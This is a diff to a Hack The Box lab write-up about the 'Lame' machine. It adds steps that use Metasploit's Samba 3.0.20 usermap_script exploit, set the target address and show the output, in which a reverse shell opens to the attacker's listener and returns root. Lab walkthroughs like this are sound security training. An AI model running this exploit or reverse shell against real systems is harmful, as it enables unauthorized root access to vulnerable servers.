@@ -121,16 +121,16 @@ Search using searchsploit:
 
 ```bash
 root@kali:~/htb# searchsploit samba 3.0.20
------------------------------------------------------------------------------------------------------------------- ----------------------------------------
- Exploit Title                                                                                                    |  Path
-                                                                                                                  | (/usr/share/exploitdb/)
------------------------------------------------------------------------------------------------------------------- ----------------------------------------
-Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                  | exploits/unix/remote/16320.rb
-Samba < 3.0.20 - Remote Heap Overflow                                                                             | exploits/linux/remote/7701.txt
------------------------------------------------------------------------------------------------------------------- ----------------------------------------
+------------------------------------------------------------------------------- ----------------------------------------
+ Exploit Title                                                                 |  Path
+                                                                               | (/usr/share/exploitdb/)
+------------------------------------------------------------------------------- ----------------------------------------
+Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploi | exploits/unix/remote/16320.rb
+Samba < 3.0.20 - Remote Heap Overflow                                          | exploits/linux/remote/7701.txt
+------------------------------------------------------------------------------- ----------------------------------------
 ```
 
-Search on metasploit:
+Let's search in metasploit for the first one:
 ```
 msf exploit(linux/samba/is_known_pipename) > search samba 3.0.20 | sort -n
 
@@ -185,5 +185,44 @@ Matching Modules
    exploit/windows/smb/group_policy_startup               2015-01-26       manual     Group Policy Script Execution From Shared Resource
    post/linux/gather/enum_configs                                          normal     Linux Gather Configurations
 
+```
+
+Exploit it:
+```
+msf > use exploit/multi/samba/usermap_script
+msf exploit(multi/samba/usermap_script) > options
+
+Module options (exploit/multi/samba/usermap_script):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   RHOST                   yes       The target address
+   RPORT  139              yes       The target port (TCP)
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+   
+msf exploit(multi/samba/usermap_script) > set RHOST 10.10.10.3
+msf exploit(multi/samba/usermap_script) > exploit
+
+[*] Started reverse TCP double handler on 10.10.14.36:4444
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo ZlOFimAIYoGdaBzj;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket B
+[*] B: "ZlOFimAIYoGdaBzj\r\n"
+[*] Matching...
+[*] A is input...
+[*] Command shell session 3 opened (10.10.14.36:4444 -> 10.10.10.3:60966) at 2020-05-23 09:51:11 -0400
+
+whoami
+root
 ```
 
